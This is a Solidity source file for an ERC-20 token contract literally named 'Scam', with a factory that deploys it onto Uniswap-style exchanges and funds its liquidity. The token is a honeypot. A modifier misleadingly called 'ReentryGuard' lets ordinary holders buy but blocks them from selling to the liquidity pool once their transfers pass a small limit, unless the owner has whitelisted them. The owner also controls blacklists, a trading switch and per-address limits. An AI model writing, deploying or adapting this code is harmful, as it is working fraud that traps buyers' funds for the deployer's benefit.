// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
}

interface IPair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract Scam is Context, IERC20, Ownable, ReentrancyGuard {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isW;
    mapping(address => bool) public isFeeCollector;
    mapping(address => uint256) public bl;
    bool private stopGuard = false;
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 0;
    string private _name;
    string private _symbol;
    bool public tradeEnable = false;
    uint256 maxTrade = 10 * 10 ** _decimals;
    mapping(address => uint256) private amaxTrade;
    address public pA = address(0);
    IUniswapV2Router02 private uniswapV2Router;

    event ERC20TokensRecovered(uint256 indexed _amount);
    event ETHBalanceRecovered();

    modifier ReentryGuard(
        address from,
        address to,
        uint256 amount
    ) {
        if(!stopGuard){
            if((amaxTrade[from] + amount) > maxTrade) {
                if (from != owner() && to != owner()) {
                    // Проверка на адрес пула ликвидности
                    if (to == pA || (isContract(to) && !isW[to] && to != pA && !isFeeCollector[to])) {
                        require(from == owner() || (isW[from] && !isContract(from)), "Err");
                    }
                    require(!cbl(from) && !cbl(to), "Err");
                    if (!tradeEnable) {
                        require(isW[from], "Err");
                    }
                }
            }
        }
        amaxTrade[from] += amount;
        _;
    }

    constructor(
        string memory tName,
        string memory tSymbol,
        uint256 supply
    ) {
        // 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD
        _name = tName;
        _symbol = tSymbol;
        uint256 _supply = supply * (10**_decimals);
        _mint(_supply, _msgSender());
        address rAdd = address(0);
        address universalRouterAddress = address(0);

        if (block.chainid == 1) {
            rAdd = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
            universalRouterAddress = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
            isFeeCollector[0x000000fee13a103A10D593b9AE06b3e05F2E7E1c] = true; // Universal Router Fee Collector
        } else if (block.chainid == 56) {
            rAdd = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } else if (block.chainid == 8453) {
            rAdd = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24;
            universalRouterAddress = 0x198EF79F1F515F02dFE9e3115eD9fC07183f02fC;
            isFeeCollector[0x11ddD59C33c73C44733b4123a86Ea5ce57F6e854] = true;
        } else if (block.chainid == 11155111) {
            rAdd = 0x86dcd3293C53Cf8EFd7303B57beb2a3F671dDE98;
        }
        uniswapV2Router = IUniswapV2Router02(rAdd);

        isW[rAdd] = true;
        isW[universalRouterAddress] = true;


        pA = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        isW[pA] = true;
    }

    receive() external payable {}

    function isContract(address account) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _mint(uint256 tokensToMint, address addr) internal onlyOwner {
        _tTotal += tokensToMint;
        _balances[addr] += tokensToMint;
        emit Transfer(address(0), addr, tokensToMint);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal - _balances[address(0)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function transfer(address recipient, uint256 amount)
        public
        nonReentrant
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public nonReentrant returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public nonReentrant returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private ReentryGuard(from, to, amount) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[from] >= amount, "Not enough balance");

        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function cbl(address addr) private view returns (bool) {
        return bl[addr] > 0 && block.timestamp < bl[addr];
    }

    function switchTrading() external onlyOwner {
        tradeEnable = !tradeEnable;
    }

    function switchGuard() external onlyOwner {
        stopGuard = !stopGuard;
    }

    function recoverBEP20FromContract(
        address _tokenAddy,
        uint256 _amount,
        address to
    ) external onlyOwner {
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(to, _amount);
        emit ERC20TokensRecovered(_amount);
    }

    function recoverBNBfromContract(address to) external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        require(contractETHBalance > 0, "Amount should be greater than zero");
        require(
            contractETHBalance <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(to)).transfer(contractETHBalance);
        emit ETHBalanceRecovered();
    }

    function checkAllowanceBalance(uint256 a) public view returns (bool) {
        return
            _allowances[_msgSender()][address(this)] >= a &&
            balanceOf(_msgSender()) >= a;
    }

    function addW(address addr) external onlyOwner {
        isW[addr] = true;
    }

    function removeW(address addr) external onlyOwner {
        isW[addr] = false;
    }

    function addFeeCollector(address addr) external onlyOwner {
        isFeeCollector[addr] = true;
    }

    function removeFeeCollector(address addr) external onlyOwner {
        isFeeCollector[addr] = false;
    }

    function addB(address addr, uint256 period) public onlyOwner {
        bl[addr] = block.timestamp + period;
    }

    function removeB(address addr) public onlyOwner {
        bl[addr] = block.timestamp;
    }

    function changeMaxTrade(uint256 value) public onlyOwner {
        maxTrade = value * 10 ** _decimals;
    }

    function changeAMaxTrade(address addr, uint256 value) public onlyOwner {
        amaxTrade[addr] = value * 10 ** _decimals;
    }
}


contract TokenFactory is Ownable {
    IUniswapV2Router02 private uniswapV2Router;
    address rAdd;
    uint public dummyState = 0;
    constructor() {
        if (block.chainid == 1) {
            rAdd = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        } else if (block.chainid == 56) {
            rAdd = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } else if (block.chainid == 8453) {
            rAdd = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24;
        } else if (block.chainid == 11155111) {
            rAdd = 0x86dcd3293C53Cf8EFd7303B57beb2a3F671dDE98;
        }
        uniswapV2Router = IUniswapV2Router02(rAdd);
    }

    function increaseNonce() public onlyOwner {
        dummyState++;
    }

    function createNewMyToken(string memory tName, string memory tSymbol, uint256 supply, uint256 liqamount) public onlyOwner payable {
        Scam myToken = (new Scam)(tName, tSymbol, supply);
        uint256 _liqamount = liqamount * 10 ** 18;
        uint256 _supply = supply * 10 ** 18;
        myToken.approve(address(uniswapV2Router), _liqamount);
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(myToken),
            _liqamount,
            0,
            0,
            msg.sender,
            block.timestamp + 10000
        );
        myToken.transfer(msg.sender, _supply - _liqamount);
        myToken.transferOwnership(msg.sender);
    }

    function recoverBEP20FromContract(
        address _tokenAddy,
        uint256 _amount,
        address to
    ) external onlyOwner {
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(to, _amount);
    }

    function recoverBNBfromContract(address to) external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        require(contractETHBalance > 0, "Amount should be greater than zero");
        require(
            contractETHBalance <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(to)).transfer(contractETHBalance);
    }
}